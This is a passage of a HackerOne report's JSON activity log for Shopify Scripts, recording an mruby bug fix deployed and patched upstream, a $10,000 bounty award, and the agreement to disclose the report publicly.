g08mzaHz81AkWCD12%2FMNsYVQR7cjgwdn0%2Bs0xVGfGhfh4MDAMmQGFe6Lif0OLiPqZvpzOsdc1U0fJguBGd%2BVFGpJYBzj3%2BaBj2VN%2BNGHLroYmrfeUAYC7jfMjbFHPWEIsnVV2UXlaBwn%2B77XmvArdijvUwKRP3s4EsxI3DWFehzXa7Gecsk2tMmt0kOjrYXTNt%2FN7x42KhOrVyhtMBIfepkwg%3D%3D\u0026X-Amz-Signature=cccdd423cb10cd70d9017f71f6e1645712f31f81130ebe82d60f4e5002f3e406"},{"id":141451,"filename":"bug-188326-mruby-engine-free.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/141/451/0755272122d136b522bd9d3037692c0c5eac7670/bug-188326-mruby-engine-free.patch?response-content-disposition=attachment%3B%20filename%3D%22bug-188326-mruby-engine-free.patch%22%3B%20filename%2A%3DUTF-8%27%27bug-188326-mruby-engine-free.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQ3JOVT23%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044825Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDGEmjMTZ%2B42U2ElKiFSRskfZ1wrVxF3tJ06TkMfcLk%2BAIhAMGEXUlLYHTI0tAfR14Q%2FlbZC6jasvfWZ1Xvj9WBrncpKrQDCFQQARoMMDEzNjE5Mjc0ODQ5Igw6Q27Zk4E2mhDIkK8qkQPD1saJxXJo5xzxC7fVYphiJ%2FxHiEAzAjpGAFbHRlj%2BLiBOmG4tQrsbkV%2BDoy35glVt3VI4PcrRoSV3Xl1l2IyyQg6MAvyC%2B8CnOcg10paQiOuIHqxgrORAtjeCM%2FYa%2B%2BhAC4ClNmzdap6B2rWS%2F5pSIBQv%2BEJ5ucGFGOTOhXwDWPOSwVcIjzZi84aBE8Q2Hp%2BMcECHk0MbOLdR6WMmv%2FUH8heXLI%2BruPp6jAdckhYnExze4vjNqLiF853%2FmOAZ5%2FOF%2FB5R7aky5RNPYUiVdcetKmZ6CT%2B07x3wuqCsncR%2F%2BTa7XXSwQmbv%2FX%2F9LJxuBI9m0amzD05qIaRW9JKLR141b8CMY2e8IRGQISPrCt8Qh5AMM6fBDRcYJy19FGv%2Fv76UtJCnBJ9PDHa9DBiX%2Fm7g1ESwgfanKtnd8zVHYVJNVHwEJnaoA42S8gvj9JC8LbG6wW26X%2BGNIqUhCEZdmyzvQW2TxPY5KZHKefNcp621V3psHl4EI4JPhLtsnkaIb%2BK%2FHnzGjxkH7LTYIIoehDsj1DDXsar%2FBTrqAZr%2BI5%2FjDHc%2BPm55e0u5NdPaVZOQUI4mihO6GyfNoTk4dhmqme4qPT3EW3BV4aHaQwUCpH7IKAahTGv%2BlphI%2BkZviJVM18LY2g08mzaHz81AkWCD12%2FMNsYVQR7cjgwdn0%2Bs0xVGfGhfh4MDAMmQGFe6Lif0OLiPqZvpzOsdc1U0fJguBGd%2BVFGpJYBzj3%2BaBj2VN%2BNGHLroYmrfeUAYC7jfMjbFHPWEIsnVV2UXlaBwn%2B77XmvArdijvUwKRP3s4EsxI3DWFehzXa7Gecsk2tMmt0kOjrYXTNt%2FN7x42KhOrVyhtMBIfepkwg%3D%3D\u0026X-Amz-Signature=8cd9647431a90e31a82b9f93a16ae5c3123cdcd453792fca5f7aa3c33499c836"}],"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1348928,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @haquaman and thanks again for your report! We deployed a fix to our production environment today, and the issue has also been patched upstream: https://github.com/mruby/mruby/commit/9a962ed2c3057be75cd77d31bfeca0ce50eb89d1\n\nThe memory leak (which is presumably still present in matz' fix) is not a concern for our production environment, as each execution gets a freshly allocated heap. If you'd like, you can open an issue in the upstream mruby repo.\n\nAs we mentioned in previous reports, it may be another week or two before we asses the impact and handle bounty payouts. Thank you for your patience.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/haquaman\"\u003e@haquaman\u003c/a\u003e and thanks again for your report! We deployed a fix to our production environment today, and the issue has also been patched upstream: \u003ca title=\"https://github.com/mruby/mruby/commit/9a962ed2c3057be75cd77d31bfeca0ce50eb89d1\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fcommit%2F9a962ed2c3057be75cd77d31bfeca0ce50eb89d1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/commit/9a962ed2c3057be75cd77d31bfeca0ce50eb89d1\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe memory leak (which is presumably still present in matz\u0026#39; fix) is not a concern for our production environment, as each execution gets a freshly allocated heap. If you\u0026#39;d like, you can open an issue in the upstream mruby repo.\u003c/p\u003e\n\n\u003cp\u003eAs we mentioned in previous reports, it may be another week or two before we asses the impact and handle bounty payouts. Thank you for your patience.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-07T21:40:35.506Z","updated_at":"2016-12-07T21:40:35.506Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"haquaman","url":"/haquaman"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370126,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify Scripts and the mruby project!","markdown_message":"\u003cp\u003eThanks for helping improve the security of Shopify Scripts and the mruby project!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-16T20:13:00.417Z","updated_at":"2016-12-16T20:13:00.417Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"10000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"haquaman","url":"/haquaman"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1371660,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks for the bounty! Disclose?","markdown_message":"\u003cp\u003eThanks for the bounty! Disclose?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-17T20:11:31.951Z","updated_at":"2016-12-17T20:11:31.951Z","first_to_agree":true,"actor":{"username":"haquaman","cleared":false,"url":"/haquaman","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/646/07cbfc394d4d3432eb95cf9735f225ea803090bb_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1372520,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-18T13:22:13.096Z","updated_at":"2016-12-18T13:22:13.096Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1372521,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-12-18T13:22:13.131Z","updated_at":"2016-12-18T13:22:13.131Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}